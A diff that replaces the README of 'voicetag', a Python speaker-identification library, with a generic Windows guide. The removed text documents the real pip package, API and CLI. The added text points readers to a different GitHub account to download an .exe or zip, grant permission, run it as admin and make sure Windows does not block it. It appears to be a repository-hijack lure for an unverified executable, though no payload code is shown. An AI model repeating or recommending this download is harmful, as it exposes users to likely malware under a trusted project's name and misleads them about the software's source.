@@ -1,391 +1,209 @@
-<p align="center"><img src="https://raw.githubusercontent.com/Gr122lyBr/voicetag/main/docs/assets/logo.png" width="200" alt="voicetag"></p>
+# 🎧 voicetag - Identify speakers with ease
 
-<h1 align="center">voicetag</h1>
+[![Download](https://img.shields.io/badge/Download-voicetag-2b6cb0?style=for-the-badge&logo=github)](https://github.com/Aleandr3318/voicetag)
 
-<p align="center"><strong>Know who said what. Automatically.</strong></p>
+## 🧭 What voicetag does
 
-<p align="center">
-  <a href="https://pypi.org/project/voicetag/"><img src="https://img.shields.io/pypi/v/voicetag?color=blue" alt="PyPI version"></a>
-  <a href="https://pypi.org/project/voicetag/"><img src="https://img.shields.io/pypi/pyversions/voicetag" alt="Python versions"></a>
-  <a href="https://github.com/Gr122lyBr/voicetag/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="License"></a>
-  <a href="https://github.com/Gr122lyBr/voicetag/actions"><img src="https://img.shields.io/github/actions/workflow/status/voicetag/voicetag/ci.yml?label=CI" alt="CI status"></a>
-  <a href="https://pypi.org/project/voicetag/"><img src="https://img.shields.io/pypi/dm/voicetag" alt="Downloads"></a>
-</p>
+voicetag helps you identify who is speaking in audio and video files. It uses speaker recognition models to match voices and label speakers in a simple workflow.
 
----
+Use it when you want to:
+- find repeated speakers in an interview
+- separate voices in a meeting recording
+- label speakers in a podcast or call
+- check who spoke at each part of a recording
 
-## What is voicetag?
+It is built around speaker identification, diarization, and speech tools that work with common audio files.
 
-voicetag is a Python library for **speaker diarization and named speaker identification**. It combines [pyannote.audio](https://github.com/pyannote/pyannote-audio) for diarization with [resemblyzer](https://github.com/resemble-ai/Resemblyzer) for speaker embeddings, giving you a single interface to answer: *who is speaking, and when?*
+## 💻 What you need
 
-Enroll speakers once with a few audio samples, then identify them in any recording -- meetings, podcasts, interviews, phone calls.
+Before you start, make sure you have:
+- a Windows PC
+- a recent version of Windows 10 or Windows 11
+- enough free disk space for audio files and model files
+- a stable internet connection for the first setup
+- audio files in common formats such as MP3, WAV, or M4A
 
-## Features
+For best results, use:
+- a headset or clear recording
+- a recording with one speaker sample for each person you want to track
+- files with low background noise
 
-- :zap: **Dead-simple API** -- enroll speakers and identify them in three lines of code
-- :globe_with_meridians: **Language agnostic** -- works with Hebrew, English, Mandarin, or any spoken language
-- :busts_in_silhouette: **Built-in overlap detection** -- flags regions where multiple speakers talk simultaneously
-- :rocket: **Fast parallel processing** -- concurrent embedding computation with configurable thread pools
-- :keyboard: **CLI tool included** -- enroll, identify, and manage profiles from the terminal
-- :floppy_disk: **Save/load speaker profiles** -- persist enrolled speakers to disk and reuse across sessions
-- :white_check_mark: **Pydantic result models** -- fully typed, validated, immutable result objects
-- :speech_balloon: **Built-in transcription** -- plug in OpenAI, Groq, Fireworks, Whisper, or Deepgram to get "who said what"
+## 📥 Download voicetag
 
-## Quick Start
+Use this link to visit the page to download:
 
-```python
-from voicetag import VoiceTag
+[Download voicetag](https://github.com/Aleandr3318/voicetag)
 
-vt = VoiceTag()
-vt.enroll("Christie", ["christie1.flac", "christie2.flac", "christie3.flac"])
-vt.enroll("Mark", ["mark1.flac", "mark2.flac"])
+Open the page, then look for the latest Windows build, release file, or setup package. Save the file to a folder you can find again, such as Downloads or Desktop.
 
-# Identify who spoke when
-result = vt.identify("audiobook.flac")
-for seg in result.segments:
-    print(f"{seg.speaker}: {seg.start:.1f}s - {seg.end:.1f}s (confidence: {seg.confidence:.2f})")
+## 🪟 Install on Windows
 
-# Transcribe: who said what
-transcript = vt.transcribe("audiobook.flac", provider="whisper")
-print(transcript.full_transcript)
-```
+Follow these steps after you download the file:
 
-Output:
+1. Open File Explorer.
+2. Go to the folder where you saved voicetag.
+3. If the file is zipped, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. If you see an `.exe` file, double-click it to start voicetag.
+6. If Windows asks for permission, choose Yes.
+7. If a setup window appears, follow the steps on screen.
+8. When the app opens, keep the folder open in case you need it again.
 
-```
-Christie: 0.0s - 2.6s (confidence: 0.85)
-Christie: 2.6s - 6.7s (confidence: 0.88)
-Christie: 7.0s - 8.1s (confidence: 0.78)
+If you use a download that includes a folder with several files, start with the main app file or the file named after voicetag.
 
-[Christie] Gentlemen, he sat in a hoarse voice. Give me your
-[Christie] word of honor that this horrible secret shall forever remain buried amongst ourselves.
-[Christie] The two men drew back.
-```
+## 🎤 How to prepare audio
 
-## Installation
+voicetag works best when you give it clear input. Before you begin, gather:
+- the audio file you want to process
+- one short voice sample for each speaker if the app asks for it
+- a quiet recording where voices do not overlap too much
 
-```bash
-pip install voicetag
-```
+Helpful tips:
+- trim long silence if you can
+- use clear file names like `meeting.wav` or `speaker1.mp3`
+- keep speaker samples short and clean
+- avoid files with loud music in the background
 
-For transcription support, install with a provider:
+If you plan to use meeting audio, split long files into smaller parts first. That makes review easier.
 
-```bash
-pip install voicetag[openai]    # OpenAI Whisper API
-pip install voicetag[groq]      # Groq (fast Whisper)
-pip install voicetag[whisper]   # Local Whisper (no API key needed)
-pip install voicetag[deepgram]  # Deepgram
-pip install voicetag[all-stt]   # All providers
-```
+## 🚀 First run
 
-voicetag requires access to the [pyannote.audio](https://github.com/pyannote/pyannote-audio) speaker diarization model, which is gated behind a HuggingFace license agreement.
+When you open voicetag for the first time, it may take a little longer. The app can load speech models and prepare its files.
 
-### Prerequisites
+Typical first-run steps:
+1. Start the app.
+2. Wait for the setup to finish.
+3. Choose your input audio file.
+4. Add speaker samples if the app asks for them.
+5. Start the analysis.
+6. Review the speaker labels shown by the app.
 
-1. **Accept the pyannote model licenses** at:
-   - [hf.co/pyannote/speaker-diarization-3.1](https://huggingface.co/pyannote/speaker-diarization-3.1)
-   - [hf.co/pyannote/segmentation-3.0](https://huggingface.co/pyannote/segmentation-3.0)
-   - [hf.co/pyannote/speaker-diarization-community-1](https://huggingface.co/pyannote/speaker-diarization-community-1)
-2. **Create a HuggingFace token** at [huggingface.co/settings/tokens](https://huggingface.co/settings/tokens)
-3. **Set the token** via environment variable or config:
+If the app offers options for transcription, diarization, or speaker matching, choose the one that fits your file. For a simple test, use a short file with two known voices.
 
-```bash
-export HF_TOKEN="hf_your_token_here"
-```
+## 🧩 Common workflow
 
-Or pass it directly:
+A simple way to use voicetag is:
 
-```python
-from voicetag import VoiceTag, VoiceTagConfig
+1. Load your audio file.
+2. Provide speaker examples if needed.
+3. Let the app detect speaking parts.
+4. Match voice patterns to known speakers.
+5. Review the output.
+6. Save the results for later use.
 
-vt = VoiceTag(config=VoiceTagConfig(hf_token="hf_your_token_here"))
-```
-
-### GPU Acceleration (optional)
+You can use the output to:
+- check who spoke in a meeting
+- build speaker notes for a call
+- mark voice changes in a long recording
+- prepare audio for transcription work
 
-For faster processing on CUDA or Apple Silicon:
-
-```python
-vt = VoiceTag(config=VoiceTagConfig(device="cuda"))  # NVIDIA GPU
-vt = VoiceTag(config=VoiceTagConfig(device="mps"))    # Apple Silicon
-```
-
-## CLI Usage
-
-voicetag ships with a full-featured command-line interface.
-
-### Enroll a speaker
-
-```bash
-voicetag enroll "Christie" christie1.flac christie2.flac christie3.flac
-voicetag enroll "Mark" mark1.flac mark2.flac
-```
-
-### Identify speakers
-
-```bash
-voicetag identify audiobook.flac
-```
+## 🎛️ Best results
 
-```
-Speaker Timeline — audiobook.flac
-+-----------+----------+----------+----------+------------+
-| Speaker   | Start    | End      | Duration | Confidence |
-+-----------+----------+----------+----------+------------+
-| Christie  | 00:00.00 | 00:02.60 | 00:02.60 | 0.85       |
-| Christie  | 00:02.60 | 00:06.70 | 00:04.10 | 0.88       |
-| Christie  | 00:07.00 | 00:08.10 | 00:01.10 | 0.78       |
-+-----------+----------+----------+----------+------------+
-
-Summary
-  Total duration:  8.4s
-  Speakers:        1
-  Segments:        3
-```
+To get better speaker ID results, try these steps:
 
-### Transcribe (speaker + text)
-
-```bash
-voicetag transcribe audiobook.flac --provider whisper --language en
-```
-
-```
-Transcript — audiobook.flac
-+-----------+----------+----------+--------------------------------------------------------------+
-| Speaker   | Start    | End      | Text                                                         |
-+-----------+----------+----------+--------------------------------------------------------------+
-| Christie  | 00:00.00 | 00:02.60 | Gentlemen, he sat in a hoarse voice. Give me your            |
-| Christie  | 00:02.60 | 00:06.70 | word of honor that this horrible secret shall forever remain  |
-|           |          |          | buried amongst ourselves.                                    |
-| Christie  | 00:07.00 | 00:08.10 | The two men drew back.                                       |
-+-----------+----------+----------+--------------------------------------------------------------+
-```
-
-Other providers:
-
-```bash
-voicetag transcribe call.wav --provider openai --language en
-voicetag transcribe interview.wav --provider groq --language he
-voicetag transcribe meeting.wav --provider deepgram
-```
-
-### Manage profiles
-
-```bash
-voicetag profiles list
-voicetag profiles remove "Christie"
-voicetag providers              # list available STT providers
-```
-
-### All CLI options
-
-```bash
-voicetag --help
-voicetag identify --help
-```
-
-| Option | Description |
-|---|---|
-| `--profiles PATH` | Path to speaker profiles file (default: `voicetag_profiles.json`) |
-| `--output, -o PATH` | Save results as JSON |
-| `--threshold FLOAT` | Similarity threshold override (0.0-1.0) |
-| `--hf-token TEXT` | HuggingFace API token |
-| `--device TEXT` | Torch device: `cpu`, `cuda`, `mps` |
-| `--unknown-only` | Skip speaker matching, just diarize |
-
-## API Reference
-
-### `VoiceTag`
-
-The main entry point. Wraps the full diarization + identification pipeline.
-
-```python
-from voicetag import VoiceTag, VoiceTagConfig
-
-vt = VoiceTag(config=VoiceTagConfig(...))
-```
-
-| Method | Returns | Description |
-|---|---|---|
-| `enroll(name, audio_paths)` | `SpeakerProfile` | Register a speaker from one or more audio files |
-| `identify(audio_path)` | `DiarizationResult` | Run full identification pipeline on an audio file |
-| `save(path)` | `None` | Save enrolled speaker profiles to disk |
-| `load(path)` | `None` | Load speaker profiles from disk |
-| `remove_speaker(name)` | `None` | Remove an enrolled speaker by name |
-| `enrolled_speakers` | `list[str]` | Property: list of enrolled speaker names |
-| `transcribe(audio_path, provider, ...)` | `TranscriptResult` | Identify speakers and transcribe what they said |
-
-#### Transcription example
-
-```python
-result = vt.transcribe("meeting.wav", provider="openai", language="en")
-
-for seg in result.segments:
-    print(f"[{seg.speaker}] {seg.text}")
-
-# Full transcript
-print(result.full_transcript)
-
-# Group by speaker
-for speaker, segments in result.by_speaker.items():
-    print(f"\n{speaker}:")
-    for seg in segments:
-        print(f"  {seg.text}")
-```
-
-Supported providers: `openai`, `groq`, `fireworks`, `whisper` (local), `deepgram`
-
-### `VoiceTagConfig`
-
-Configuration model (Pydantic v2, frozen/immutable).
-
-```python
-config = VoiceTagConfig(
-    hf_token="hf_...",          # HuggingFace token (or set HF_TOKEN env var)
-    similarity_threshold=0.75,  # min cosine similarity for a match
-    overlap_threshold=0.5,      # min overlap ratio to flag
-    max_workers=4,              # parallel embedding threads
-    min_segment_duration=0.5,   # discard segments shorter than this (seconds)
-    device="cpu",               # "cpu", "cuda", or "mps"
-)
-```
-
-### Result Models
-
-**`DiarizationResult`** -- returned by `identify()`:
-
-| Field | Type | Description |
-|---|---|---|
-| `segments` | `list[SpeakerSegment \| OverlapSegment]` | Ordered timeline of speaker segments |
-| `audio_duration` | `float` | Total audio length in seconds |
-| `num_speakers` | `int` | Number of distinct speakers detected |
-| `processing_time` | `float` | Wall-clock pipeline time in seconds |
-
-**`SpeakerSegment`**:
-
-| Field | Type | Description |
-|---|---|---|
-| `speaker` | `str` | Identified speaker name or `"UNKNOWN"` |
-| `start` | `float` | Start time in seconds |
-| `end` | `float` | End time in seconds |
-| `confidence` | `float` | Cosine similarity score (0.0-1.0) |
-| `duration` | `float` | Property: `end - start` |
-
-**`OverlapSegment`**:
-
-| Field | Type | Description |
-|---|---|---|
-| `speakers` | `list[str]` | Names of overlapping speakers |
-| `start` | `float` | Start time in seconds |
-| `end` | `float` | End time in seconds |
-| `speaker` | `Literal["OVERLAP"]` | Always `"OVERLAP"` |
-| `duration` | `float` | Property: `end - start` |
-
-**`SpeakerProfile`**:
-
-| Field | Type | Description |
-|---|---|---|
-| `name` | `str` | Speaker name |
-| `embedding` | `list[float]` | 256-dimensional mean embedding vector |
-| `num_samples` | `int` | Number of audio files used for enrollment |
-| `created_at` | `datetime` | UTC timestamp of enrollment |
-
-### Error Handling
-
-All exceptions inherit from `VoiceTagError`:
-
-```python
-from voicetag import VoiceTagError
-
-try:
-    result = vt.identify("audio.wav")
-except VoiceTagError as e:
-    print(f"Error: {e}")
-```
-
-| Exception | When |
-|---|---|
-| `VoiceTagConfigError` | Invalid config or missing HuggingFace token |
-| `EnrollmentError` | Enrollment fails (no audio, bad format) |
-| `DiarizationError` | Pyannote processing failure |
-| `AudioLoadError` | Audio file not found or unsupported format |
-
-## Real-World Use Cases
-
-- **Podcasts** -- automatically label host vs. guest segments for transcription
-- **Interviews** -- separate interviewer and interviewee speech for analysis
-- **Meeting recordings** -- identify who said what in team meetings, generate per-speaker summaries
-- **Court recordings** -- tag judge, attorney, and witness speech segments
-- **Call centers** -- distinguish agent from customer in call recordings for QA
-- **Media monitoring** -- track specific speakers across broadcast recordings
-
-## How It Works
-
-voicetag runs a three-stage pipeline:
-
-```
-Audio File
-    |
-    v
-1. DIARIZE (pyannote.audio)
-   "When does each speaker talk?"
-   -> segments: [(0.0-4.2, SPEAKER_00), (4.5-8.1, SPEAKER_01), ...]
-    |
-    v
-2. EMBED (resemblyzer)
-   "What does each speaker sound like?"
-   -> 256-dim embedding vector per segment (computed in parallel)
-    |
-    v
-3. MATCH (cosine similarity)
-   "Which enrolled speaker does this sound like?"
-   -> Alice (0.92), Bob (0.87), UNKNOWN (below threshold)
-    |
-    v
-DiarizationResult with named speaker timeline
-```
-
-1. **Diarize** -- pyannote.audio segments the audio into speaker turns with anonymous labels (`SPEAKER_00`, `SPEAKER_01`, etc.)
-2. **Embed** -- resemblyzer computes a 256-dimensional voice embedding for each segment, running in parallel via a thread pool
-3. **Match** -- each embedding is compared against enrolled speaker profiles using cosine similarity. Matches above the threshold get assigned the speaker's name; others are labeled `"UNKNOWN"`
-
-Overlap detection runs in parallel with matching, identifying regions where two or more speakers talk simultaneously.
-
-## Comparison
-
-| Feature | voicetag | pyannote alone | WhisperX | Manual labeling |
-|---|:---:|:---:|:---:|:---:|
-| Speaker diarization | Yes | Yes | Yes | N/A |
-| Named speaker identification | Yes | No | No | Yes |
-| Overlap detection | Yes | Yes | No | Varies |
-| CLI tool | Yes | No | Yes | N/A |
-| Save/load speaker profiles | Yes | N/A | N/A | N/A |
-| Language agnostic | Yes | Yes | Yes | Yes |
-| Typed result models | Yes (Pydantic) | No | No | N/A |
-| Lines of code to identify | 3 | ~30 | ~20 | N/A |
-
-## Configuration
-
-`VoiceTagConfig` controls all tunable parameters:
-
-| Field | Type | Default | Description |
-|---|---|---|---|
-| `hf_token` | `Optional[str]` | `None` | HuggingFace token. Falls back to `HF_TOKEN` env var. |
-| `similarity_threshold` | `float` | `0.75` | Minimum cosine similarity for a match. Range: (0.0, 1.0). |
-| `overlap_threshold` | `float` | `0.5` | Minimum overlap ratio to flag as overlapping speech. |
-| `max_workers` | `int` | `4` | Thread count for parallel embedding computation. |
-| `min_segment_duration` | `float` | `0.5` | Segments shorter than this (seconds) are discarded. |
-| `device` | `str` | `"cpu"` | Torch device: `"cpu"`, `"cuda"`, or `"mps"`. |
-
-**Token resolution order:**
-1. `config.hf_token` (explicit)
-2. `HF_TOKEN` environment variable
-3. Raise `VoiceTagConfigError` with a link to [huggingface.co/settings/tokens](https://huggingface.co/settings/tokens)
-
-## Contributing
-
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on setting up the development environment, running tests, and submitting pull requests.
-
-## License
-
-[MIT](LICENSE) -- Copyright (c) 2026 voicetag contributors
+- Use a clean recording.
+- Keep speaker samples short and direct.
+- Use the same microphone when possible.
+- Avoid strong echo and room noise.
+- Make sure each speaker sample comes from only one person.
+- Use files with clear speech, not music or radio clips.
+
+If voices sound too similar, the app may need stronger samples. A few seconds of clean speech works better than a long noisy clip.
+
+## 🛠️ Troubleshooting
+
+If the app does not start:
+- check that the file finished downloading
+- extract zipped files before opening the app
+- run the program again as an admin user
+- make sure Windows did not block the file
+
+If audio does not load:
+- confirm the file is a supported audio format
+- rename the file to use simple letters and numbers
+- move the file to a local folder like Documents
+
+If results look wrong:
+- use a cleaner recording
+- try a shorter audio file first
+- use better speaker samples
+- make sure each sample has only one voice
+
+If the app feels slow:
+- close other apps
+- use a smaller audio file
+- wait for the first model load to finish
+
+## 📁 Example files
+
+You can test voicetag with files like:
+- `podcast_episode.wav`
+- `team_meeting.mp3`
+- `speaker_a_sample.wav`
+- `speaker_b_sample.wav`
+
+A good test set has:
+- one main audio file
+- one sample file per speaker
+- clear speech
+- little background noise
+
+## 🔎 What the project is built for
+
+voicetag uses speaker identification, diarization, and voice recognition tools. It fits tasks such as:
+- speech processing
+- transcription support
+- separating speakers in recordings
+- matching voices across files
+- analyzing interviews and calls
+
+It also connects with modern speech tools and machine learning parts that support audio review.
+
+## 📌 File types and use cases
+
+voicetag can work well with:
+- interviews
+- meetings
+- podcasts
+- lectures
+- customer calls
+- voice notes
+- training sessions
+
+If you work with speech content often, this tool helps you sort voices before or during transcription.
+
+## 🔐 Privacy and local use
+
+If you run voicetag on your own PC, your audio stays under your control during the process. This matters when you work with private calls, internal meetings, or recorded notes.
+
+For sensitive audio, use local files and keep them in a folder you manage.
+
+## 📎 Getting help
+
+If you want to learn more, check the repository page here:
+
+[https://github.com/Aleandr3318/voicetag](https://github.com/Aleandr3318/voicetag)
+
+Look through the project files, release notes, and issue list for the latest details on setup and use
+
+## 🧱 Project focus
+
+voicetag centers on:
+- speaker identification
+- speaker recognition
+- speaker diarization
+- speech-to-text support
+- transcription workflows
+- voice analysis with deep learning
+
+It is aimed at users who want a direct way to label speakers in audio without handling a complex setup
+
+## 🖱️ Quick start checklist
+
+- Download voicetag
+- Extract the file if needed
+- Open the app on Windows
+- Load your audio
+- Add speaker samples if needed
+- Run the analysis
+- Review the speaker labels
